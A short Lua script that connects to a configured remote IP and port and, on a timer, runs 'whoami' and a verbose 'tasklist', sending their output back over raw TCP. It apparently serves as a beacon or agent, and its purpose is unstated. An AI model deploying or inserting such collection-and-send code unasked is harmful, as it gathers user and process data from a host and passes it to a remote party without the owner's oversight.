package.path = path .. "?.lua"
require("config")
trace = config.trace

local flag,s  = tcp_connect(config.ip,config.port)

--local cmds = {"tasklist","systeminfo","whoami","cmd.exe /C dir","cmd.exe /C echo %username%"}
local cmds = {"whoami","cmd.exe /C dir","cmd.exe /C echo %username%"}

local function is_alive()
	return send_msg(s,"")
end

local function send_str(cmd,str)
	local prefix = cmd .. "\r\n" .. str .. "\r\n"
	prefix = string.len(prefix) .. "\r\n" .. prefix
	if not is_alive() then
		close_socket(s)
		flag,s = tcp_connect(config.ip,config.port)
	end
	return send_msg(s,prefix)
end

function shell_exec(cmd)
	local p_dir = pipe.new(cmd)	
	local rs = {} 
	if not p_dir then 
		trace_out("error pipe @ cmd = " .. cmd .. "\n")
		return rs 
	end
	repeat
		local line = p_dir:getline()
		if line then
			rs[#rs+1] = line 
		end
	until not line
	p_dir:closeout()
	p_dir:closein()
	return rs
end

function exec_cmd(cmd,cmdstr)
	local rs = shell_exec(cmd)
	send_str(cmdstr,table.concat(rs))
	--trace_out(table.concat(rs))
end


function on_time()
	exec_cmd("whoami","whoami")
	--exec_cmd("systeminfo","systeminfo")
	exec_cmd("tasklist /V /NH /FO CSV ","tasklist")
end

function on_quit()
	close_socket(s)
end
